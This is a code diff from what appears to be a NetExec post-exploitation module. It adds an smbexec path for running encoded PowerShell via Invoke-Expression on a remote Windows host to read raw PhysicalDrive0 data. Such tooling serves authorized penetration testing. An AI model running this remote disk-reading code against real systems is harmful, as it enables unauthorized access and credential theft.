@@ -115,8 +115,10 @@ class NXCModule:
         # scary base64 powershell code :)
         # This to read the PhysicalDrive0 file
         get_data_script = f"""powershell.exe -c "$base64Cmd = '{self.ps_script_b64}';$decodedCmd = [Text.Encoding]::Unicode.GetString([Convert]::FromBase64String($base64Cmd)) + '; read_disk {offset} {fixed_size}'; Invoke-Expression $decodedCmd" """
-        if self.connection.__class__.__name__ == "wmi":  # noqa: SIM108
+        if self.connection.__class__.__name__ == "wmi":
             data_output = self.connection.execute_psh(get_data_script, True)
+        elif self.connection.__class__.__name__ == "smb":
+            data_output = self.execute(get_data_script, True, ["smbexec"])
         else:
             data_output = self.execute(get_data_script, True)
         self.logger.debug(f"{offset=},{size=},{fixed_size=}")
